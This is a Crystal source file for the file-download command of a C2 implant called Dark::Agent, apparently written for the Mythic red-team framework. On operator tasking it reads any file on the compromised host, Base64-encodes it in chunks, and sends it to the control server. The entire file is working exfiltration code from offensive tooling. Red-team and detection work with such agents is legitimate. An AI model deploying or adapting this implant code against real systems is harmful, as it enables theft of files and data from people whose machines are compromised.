require "./base"
require "base64"

module Dark::Agent::Commands
  class Download < Base
    def name : String
      "download"
    end

    def execute(task : JSON::Any) : Nil
      task_id = task["id"]?.try(&.as_s) || ""
      path = task["parameters"]["path"]?.try(&.as_s) || ""

      if path.empty?
        MessageHandler.add_response(task_id, :error, "No file path specified")
        return
      end

      # Handle file path resolution
      file_path = path.starts_with?('/') ? path : File.join(Dir.current, path)

      # Check if file exists and is readable
      unless File.exists?(file_path)
        MessageHandler.add_response(task_id, :error, "File not found: #{file_path}")
        return
      end

      # Check file read permissions
      unless File::Info.readable?(file_path)
        MessageHandler.add_response(task_id, :error, "Cannot read file: #{file_path}")
        return
      end

      # Get file size and calculate chunk information
      file_size = File.size(file_path)
      chunk_size = config.chunk_size
      total_chunks = (file_size / chunk_size).to_i + (file_size % chunk_size > 0 ? 1 : 0)

      log_debug("Starting download of #{file_path} (#{file_size} bytes in #{total_chunks} chunks)")

      # Send initial notification to the Mythic UI
      MessageHandler.add_response(task_id, :info, "Starting download of #{path} (#{(file_size / 1024.0).round(2)} KB in #{total_chunks} chunks)\n")

      # Send initial chunk info to server
      initial_response = {
        "action" => "post_response",
        "responses" => [{
          "task_id" => task_id,
          "download" => {
            "total_chunks" => total_chunks,
            "full_path" => file_path,
            "chunk_size" => chunk_size
          }
        }]
      }

      # Start file transfer by sending initial response directly
      transport = Dark::Agent::Transport::Active.instance
      response_json = transport.send_and_receive(initial_response.to_json)

      begin
        response_data = JSON.parse(response_json)

        # Get file_id from responses array - matches Mythic's expected format
        file_id = response_data["responses"]?.try(&.[0]["file_id"]?.try(&.as_s))

        if file_id.nil? || file_id.empty?
          MessageHandler.add_response(task_id, :error, "Failed to get file_id for download")
          return
        end

        log_debug("Received file_id: #{file_id}, sending file chunks")

        # Read and send file in chunks
        chunk_num = 1
        File.open(file_path, "rb") do |file|
          buffer = Bytes.new(chunk_size)

          while (bytes_read = file.read(buffer)) > 0
            # Create slice of the actual bytes read
            chunk_data = buffer[0...bytes_read]

            # Encode chunk data and send to server
            chunk_response = {
              "action" => "post_response",
              "responses" => [{
                "task_id" => task_id,
                "download" => {
                  "chunk_num" => chunk_num,
                  "file_id" => file_id,
                  "chunk_data" => Base64.strict_encode(chunk_data)
                }
              }]
            }

            # Send chunk directly
            transport.send_and_receive(chunk_response.to_json)

            log_debug("Sent chunk #{chunk_num}/#{total_chunks} (#{chunk_data.size} bytes)")

            # Send progress update to Mythic UI every 5th chunk or for first/last chunk
            if chunk_num == 1 || chunk_num % 5 == 0 || chunk_num == total_chunks
              progress_percent = (chunk_num.to_f / total_chunks * 100).to_i
              MessageHandler.add_response(task_id, :info, "Download progress: #{chunk_num}/#{total_chunks} chunks (#{progress_percent}%)\n")
            end

            chunk_num += 1
          end
        end

        log_debug("File transfer complete: #{file_path}")

        # Create artifact to track the downloaded file
        MessageHandler.add_response(task_id, :artifact, base_artifact: "File Read", artifact: "#{file_path}", needs_cleanup: false)

        MessageHandler.add_response(task_id, :success, "Downloaded file #{path} successfully")
      rescue ex
        log_error("Error during file download: #{ex.message}")
        log_error(ex.backtrace.join("\n"))
        MessageHandler.add_response(task_id, :error, "Error during file download: #{ex.message}")
      end
    end
  end
end